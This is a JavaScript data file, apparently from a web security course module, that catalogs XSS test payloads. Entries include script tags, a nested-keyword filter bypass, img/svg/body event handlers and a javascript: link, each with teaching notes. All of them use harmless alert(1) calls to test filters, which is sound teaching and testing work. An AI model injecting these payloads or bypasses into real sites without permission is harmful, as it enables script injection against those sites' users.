/*
 * payload_catalog.js
 *
 * Module 16: Testing Methodology & Payload Craft.
 *
 * A small, representative catalog of real XSS payload SHAPES, each
 * exercising a different sink or filter-bypass technique this course
 * has already covered. This is the beginning of the kind of payload
 * list a real security tester keeps and grows over their career -- not
 * exhaustive, but structured to cover distinct categories rather than
 * many trivial variations of the same idea.
 *
 * Introduced in: Module 16. No previous module's equivalent -- this is
 * a new kind of artifact (a data catalog, not a server) for this course.
 * Prerequisite concepts: every prior XSS module -- each entry below is
 * cross-referenced to where it was first introduced.
 */

'use strict';

const PAYLOAD_CATALOG = [
  {
    name: 'plain-text-control',
    payload: 'hello world',
    note: 'Benign control case -- should pass through completely unmodified. If THIS gets altered, something else is wrong.',
  },
  {
    name: 'classic-script-tag',
    payload: '<script>alert(1)</script>',
    note: 'The textbook payload (Module 05). A filter that only catches this one is catching the easiest case.',
  },
  {
    name: 'uppercase-script-tag',
    payload: '<SCRIPT>alert(1)</SCRIPT>',
    note: 'Same idea, different case -- checks whether a filter is actually case-insensitive.',
  },
  {
    name: 'nested-script-bypass',
    payload: '<scrscriptipt>alert(1)</scrscriptipt>',
    note: 'A single-pass removal of the word "script" leaves behind "<script>...</script>" -- see target.js\'s naiveFilter().',
  },
  {
    name: 'img-onerror',
    payload: '<img src=x onerror=alert(1)>',
    note: 'No "<script>" tag at all (Module 07\'s Brain Exercise). Tests whether a filter is tag-specific instead of sink-aware.',
  },
  {
    name: 'svg-onload',
    payload: '<svg onload=alert(1)>',
    note: 'Another non-script-tag executor, different element entirely.',
  },
  {
    name: 'body-onload',
    payload: '<body onload=alert(1)>',
    note: 'An event handler on a structural tag most filters don\'t expect to see mid-page.',
  },
  {
    name: 'javascript-href',
    payload: '<a href="javascript:alert(1)">click</a>',
    note: 'Dangerous URL scheme rather than an inline handler -- a completely different sink shape (Module 06 vocabulary).',
  },
];

module.exports = { PAYLOAD_CATALOG };
